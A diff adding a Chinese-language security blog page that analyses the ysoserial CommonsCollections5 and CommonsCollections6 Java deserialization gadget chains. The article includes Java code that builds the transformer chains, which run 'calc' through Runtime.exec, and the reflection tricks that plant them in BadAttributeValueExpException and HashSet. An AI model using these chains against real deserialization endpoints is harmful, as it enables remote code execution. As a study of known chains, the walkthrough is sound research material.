@@ -1,0 +1,612 @@
+
+<!DOCTYPE html>
+<html lang="zh-cn">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="self_209&#39;blog">
+    <title>java反序列化Commons Collections(四) - self_209&#39;blog</title>
+    <meta name="author" content="self_209">
+    
+    
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"articleBody":"本文继续CommonsCollections5 、 CommonsCollections6 Gadget chain 分析，cc5、6的执行类与cc1一样，所以这里只对不一样的部分进行分析。\n\n\n \n\nCommonsCollections5漏洞环境：\njava：Java SE 8 Development Kit 8u65\ncommons-collections：3.2.1\ngradle：implementation group: ‘commons-collections’, name: ‘commons-collections’, version: ‘3.2.1’\nysoserial Gadget chain：\n123456789Gadget chain:\tObjectInputStream.readObject()\t\tBadAttributeValueExpException.readObject()\t\t\tTiedMapEntry.toString()\t\t\tTiedMapEntry.getValue()\t\t\t\tLazyMap.get()\t\t\t\t\tChainedTransformer.transform()\t\t\t\t\t\tConstantTransformer.transform()\t\t\t\t\t\tInvokerTransformer.transform()\n\nTiedMapEntry.getValue()1234567891011121314151617public class TiedMapEntry implements Map.Entry, KeyValue, Serializable &#123;    private final Object key;    private final Map map;            public TiedMapEntry(Map map, Object key) &#123;        super();        this.map = map;        this.key = key;    &#125;        public Object getValue() &#123;        return map.get(key);    &#125;    &#125;\n\n在TiedMapEntry类的getValue方法中调用了get方法，map、key可通过构造方法传递。\nTiedMapEntry.toString()123public String toString() &#123;        return getKey() + &quot;=&quot; + getValue();&#125;\n\nTiedMapEntry类的toString方法调用了getValue方法。\n12345678910111213141516171819public static void main(String[] args)&#123;\tTransformer[] transformers = new Transformer[]&#123;                //ConstantTransformer对象负责把String类型换成Runtime.class                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        //new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法\tTransformer chainedTransformer = (Transformer) new ChainedTransformer(transformers);        //decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);\tMap&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;();        //调用decorate静态方法构造LazyMap对象，它返回Map类型。\tMap&lt;Object,Object&gt; r =  LazyMap.decorate(map,chainedTransformer);\tTiedMapEntry tiedMapEntry = new TiedMapEntry(r, r);    tiedMapEntry.toString();&#125;\n\n\nBadAttributeValueExpException.readObject()1234567891011121314151617181920212223242526272829303132333435public class BadAttributeValueExpException extends Exception   &#123;\t    private Object val;        public BadAttributeValueExpException (Object val) &#123;        this.val = val == null ? null : val.toString();    &#125;        public String toString()  &#123;        return &quot;BadAttributeValueException: &quot; + val;    &#125;        private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;        ObjectInputStream.GetField gf = ois.readFields();        Object valObj = gf.get(&quot;val&quot;, null);        if (valObj == null) &#123;            val = null;        &#125; else if (valObj instanceof String) &#123;            val= valObj;        &#125; else if (System.getSecurityManager() == null                || valObj instanceof Long                || valObj instanceof Integer                || valObj instanceof Float                || valObj instanceof Double                || valObj instanceof Byte                || valObj instanceof Short                || valObj instanceof Boolean) &#123;            val = valObj.toString();        &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();        &#125;    &#125;\t&#125;\n\nBadAttributeValueExpException的readObject方法中调用了valObj的toString方法，valObj对象是通过从输入流读取val获取指定 Object 字段，也就是说我们需要把tiedMapEntry对象传递到val属性中，但是直接通过构造函数的话会直接调用toString方法，所以这里使用反射，先构造BadAttributeValueExpException对象传递null，完成实例化后通过反射修改val的值。\n123456789101112131415161718Transformer[] transformers = new Transformer[]&#123;                //ConstantTransformer对象负责把String类型换成Runtime.class                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        //new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法        Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers);        //decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);        Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;();        //调用decorate静态方法构造LazyMap对象，它返回Map类型。        Map&lt;Object,Object&gt; r =  LazyMap.decorate(map,chainedTransformer);        TiedMapEntry tiedMapEntry = new TiedMapEntry(r, r);        BadAttributeValueExpException val = new BadAttributeValueExpException(null);        Field valfield = val.getClass().getDeclaredField(&quot;val&quot;);        valfield.setAccessible(true);        valfield.set(val,tiedMapEntry);\n\n\nCommonsCollections6ysoserial Gadget chain：\n1234567891011Gadget chain:\tjava.io.ObjectInputStream.readObject()\t\tHashSet.readObject()\t\t\tHashMap.put()\t\t\tHashMap.hash()\t\t\t\tTiedMapEntry.hashCode()\t\t\t\tTiedMapEntry.getValue()\t\t\t\t\tLazyMap.get()\t\t\t\t\t\tChainedTransformer.transform()\t\t\t\t\t\t\tConstantTransformer.transform()\t\t\t\t\t\t\tInvokerTransformer.transform()\n\nCC6的HashMap.hash调用了hashCode方法，这个在URLDNS中有介绍到，这里就不赘述了。我们直接看HashMap.put()。\nHashMap.put()12345678static final int hash(Object key) &#123;        int h;        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125;public V put(K key, V value) &#123;        return putVal(hash(key), key, value, false, true);&#125;\n\nput方法中调用了hash方法，传递一个key对象，那我们只需要把TiedMapEntry对象传递到key中，当调用hash方法就会就会返回TiedMapEntry.hashCode()\n12345678910111213141516Transformer[] transformers = new Transformer[]&#123;                //ConstantTransformer对象负责把String类型换成Runtime.class                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;//new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers);//decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;();//调用decorate静态方法构造LazyMap对象，它返回Map类型。Map&lt;Object,Object&gt; r =  LazyMap.decorate(map,chainedTransformer);TiedMapEntry tiedMapEntry = new TiedMapEntry(r, r);Map&lt;TiedMapEntry,Integer&gt; map2 = new HashMap&lt;&gt;();map2.put(tiedMapEntry,1);\n\n\nHashSet.readObject()12345678910111213141516171819202122232425262728293031323334353637383940414243private void readObject(java.io.ObjectInputStream s)    throws java.io.IOException, ClassNotFoundException &#123;    // Read in any hidden serialization magic    s.defaultReadObject();    // Read capacity and verify non-negative.    int capacity = s.readInt();    if (capacity &lt; 0) &#123;        throw new InvalidObjectException(&quot;Illegal capacity: &quot; +                                         capacity);    &#125;    // Read load factor and verify positive and non NaN.    float loadFactor = s.readFloat();    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) &#123;        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +                                         loadFactor);    &#125;    // Read size and verify non-negative.    int size = s.readInt();    if (size &lt; 0) &#123;        throw new InvalidObjectException(&quot;Illegal size: &quot; +                                         size);    &#125;    // Set the capacity according to the size and load factor ensuring that    // the HashMap is at least 25% full but clamping to maximum capacity.    capacity = (int) Math.min(size * Math.min(1 / loadFactor, 4.0f),            HashMap.MAXIMUM_CAPACITY);    // Create backing HashMap    map = (((HashSet&lt;?&gt;)this) instanceof LinkedHashSet ?           new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :           new HashMap&lt;E,Object&gt;(capacity, loadFactor));    // Read in all elements in the proper order.    for (int i=0; i&lt;size; i++) &#123;        @SuppressWarnings(&quot;unchecked&quot;)            E e = (E) s.readObject();        map.put(e, PRESENT);    &#125;&#125;\n\n在HashSet.readObject方法中，跟进put()方法，进入java.util.HashMap中调用put()方法，接着调用hash()方法，进而调用key.hashCode()，这里只需要让key为TiedMapEntry对象即可。这里通过反射获取HashSet的class对象的map属性，然后通过get方法获取hashSet对象上map字段的值。再反射获取HashMap的class对象的table属性，然后通过get方法获取innImpl对象上table字段的值。table字段的值是Node&lt;K,V&gt;对象，这里我并不知道Node&lt;K,V&gt;对象是什么，只知道他是HashMap的内部类，之后获取Node&lt;K,V&gt;类的class对象并且获取key属性，将tiedMapEntry对象set给key属性，讲道理这里我并不是很理解，我只知道ysoserial工具是这样操作的。\n123456789101112131415161718192021222324252627282930Transformer[] transformers = new Transformer[]&#123;                //ConstantTransformer对象负责把String类型换成Runtime.class                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;//new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers);//decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;();//调用decorate静态方法构造LazyMap对象，它返回Map类型。Map&lt;Object,Object&gt; r =  LazyMap.decorate(map,chainedTransformer);TiedMapEntry tiedMapEntry = new TiedMapEntry(r, r);Map&lt;TiedMapEntry,Integer&gt; map2 = new HashMap&lt;&gt;();HashSet hashSet = new HashSet(1);hashSet.add(&quot;foo&quot;);Field f = HashSet.class.getDeclaredField(&quot;map&quot;);f.setAccessible(true);HashMap innImpl = (HashMap) f.get(hashSet);Field f2 = HashMap.class.getDeclaredField(&quot;table&quot;);f2.setAccessible(true);Object[] array = (Object[]) f2.get(innImpl);Object node = array[0];if(node == null)&#123;\tnode = array[1];&#125;Field keyField = node.getClass().getDeclaredField(&quot;key&quot;);keyField.setAccessible(true);keyField.set(node,tiedMapEntry);\n\n\n","dateCreated":"2022-01-02T20:39:42+08:00","dateModified":"2022-01-07T16:17:28+08:00","datePublished":"2022-01-02T20:39:42+08:00","description":"本文继续CommonsCollections5 、 CommonsCollections6 Gadget chain 分析，cc5、6的执行类与cc1一样，所以这里只对不一样的部分进行分析。","headline":"java反序列化Commons Collections(四)","image":[null,"419522.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://self209.github.io/2022/01/02/20220102-1/"},"publisher":{"@type":"Organization","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"url":"https://self209.github.io/2022/01/02/20220102-1/","keywords":"反序列化, java安全","thumbnailUrl":"419522.jpg"}</script>
+    <meta name="description" content="本文继续CommonsCollections5 、 CommonsCollections6 Gadget chain 分析，cc5、6的执行类与cc1一样，所以这里只对不一样的部分进行分析。">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="java反序列化Commons Collections(四)">
+<meta property="og:url" content="https://self209.github.io/2022/01/02/20220102-1/index.html">
+<meta property="og:site_name" content="self_209&#39;blog">
+<meta property="og:description" content="本文继续CommonsCollections5 、 CommonsCollections6 Gadget chain 分析，cc5、6的执行类与cc1一样，所以这里只对不一样的部分进行分析。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://self209.github.io/2022/01/02/20220102-1/image-20220106213844517.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/02/20220102-1/image-20220106214927006.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/02/20220102-1/image-20220107123408957.png">
+<meta property="og:image" content="https://self209.github.io/2022/01/02/20220102-1/image-20220107150916256.png">
+<meta property="article:published_time" content="2022-01-02T12:39:42.000Z">
+<meta property="article:modified_time" content="2022-01-07T08:17:28.095Z">
+<meta property="article:author" content="self_209">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://self209.github.io/2022/01/02/20220102-1/image-20220106213844517.png">
+    
+    
+        
+    
+    
+    
+    
+        <meta property="og:image" content="https://self209.github.io/2022/01/02/20220102-1/419522.jpg"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://self209.github.io/2022/01/02/20220102-1/419522.jpg"/>
+    
+    
+    <!--STYLES-->
+    
+<link rel="stylesheet" href="/assets/css/style-gt5qcce6mgvuqwcgifha2ylts94nspkxjckwcuei5fxp2ypavhmsle0ivz1f.min.css">
+
+    <!--STYLES END-->
+    
+
+    
+
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+
+<header id="header" data-behavior="5">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/"
+            aria-label=""
+        >
+            self_209&#39;blog
+        </a>
+    </div>
+    
+        
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="打开链接: /#about"
+            >
+        
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+<nav id="sidebar" data-behavior="5">
+    <div class="sidebar-container">
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/"
+                            
+                            rel="noopener"
+                            title="首页"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">首页</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="分类"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">分类</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="标签"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">标签</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="归档"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">归档</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="关于"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">关于</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/self209"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://twitter.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Twitter"
+                        >
+                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="mailto:2662686939@qq.com"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="邮箱"
+                        >
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">邮箱</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+        <div class="post-header-cover
+                    text-center
+                    "
+             style="background-image:url('/2022/01/02/20220102-1/419522.jpg');"
+             data-behavior="5">
+            
+                <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            java反序列化Commons Collections(四)
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2022-01-02T20:39:42+08:00">
+	
+		    1月 02, 2022
+    	
+    </time>
+    
+</div>
+
+    
+</div>
+
+            
+        </div>
+
+            <div id="main" data-behavior="5"
+                 class="hasCover
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
+    
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p>本文继续CommonsCollections5 、 CommonsCollections6 Gadget chain 分析，cc5、6的执行类与cc1一样，所以这里只对不一样的部分进行分析。</p>
+<span id="more"></span>
+
+ <h1 id="table-of-contents">目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CommonsCollections5"><span class="toc-text">CommonsCollections5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TiedMapEntry-getValue"><span class="toc-text">TiedMapEntry.getValue()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TiedMapEntry-toString"><span class="toc-text">TiedMapEntry.toString()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BadAttributeValueExpException-readObject"><span class="toc-text">BadAttributeValueExpException.readObject()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CommonsCollections6"><span class="toc-text">CommonsCollections6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap-put"><span class="toc-text">HashMap.put()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashSet-readObject"><span class="toc-text">HashSet.readObject()</span></a></li></ol></li></ol>
+
+<h2 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h2><p><strong>漏洞环境：</strong></p>
+<p>java：<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">Java SE 8 Development Kit 8u65</a></p>
+<p>commons-collections：3.2.1</p>
+<p>gradle：implementation group: ‘commons-collections’, name: ‘commons-collections’, version: ‘3.2.1’</p>
+<p><strong>ysoserial Gadget chain：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		BadAttributeValueExpException.readObject()</span><br><span class="line">			TiedMapEntry.toString()</span><br><span class="line">			TiedMapEntry.getValue()</span><br><span class="line">				LazyMap.get()</span><br><span class="line">					ChainedTransformer.transform()</span><br><span class="line">						ConstantTransformer.transform()</span><br><span class="line">						InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>
+
+<h3 id="TiedMapEntry-getValue"><a href="#TiedMapEntry-getValue" class="headerlink" title="TiedMapEntry.getValue()"></a>TiedMapEntry.getValue()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>, <span class="title">KeyValue</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.map = map;</span><br><span class="line">        <span class="keyword">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在TiedMapEntry类的getValue方法中调用了get方法，map、key可通过构造方法传递。</p>
+<h3 id="TiedMapEntry-toString"><a href="#TiedMapEntry-toString" class="headerlink" title="TiedMapEntry.toString()"></a>TiedMapEntry.toString()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>TiedMapEntry类的toString方法调用了getValue方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">//ConstantTransformer对象负责把String类型换成Runtime.class</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法</span></span><br><span class="line">	Transformer chainedTransformer = (Transformer) <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">//decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);</span></span><br><span class="line">	Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="comment">//调用decorate静态方法构造LazyMap对象，它返回Map类型。</span></span><br><span class="line">	Map&lt;Object,Object&gt; r =  LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">	TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(r, r);</span><br><span class="line">    tiedMapEntry.toString();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220106213844517.png" alt="image-20220106213844517"></p>
+<h3 id="BadAttributeValueExpException-readObject"><a href="#BadAttributeValueExpException-readObject" class="headerlink" title="BadAttributeValueExpException.readObject()"></a>BadAttributeValueExpException.readObject()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BadAttributeValueExpException</span> <span class="keyword">extends</span> <span class="title">Exception</span>   </span>&#123;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">private</span> Object val;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BadAttributeValueExpException</span> <span class="params">(Object val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.val = val == <span class="keyword">null</span> ? <span class="keyword">null</span> : val.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span>  </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;BadAttributeValueException: &quot;</span> + val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">        Object valObj = gf.get(<span class="string">&quot;val&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">            val = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>BadAttributeValueExpException的readObject方法中调用了valObj的toString方法，valObj对象是通过从输入流读取val获取指定 Object 字段，也就是说我们需要把tiedMapEntry对象传递到val属性中，但是直接通过构造函数的话会直接调用toString方法，所以这里使用反射，先构造BadAttributeValueExpException对象传递null，完成实例化后通过反射修改val的值。</p>
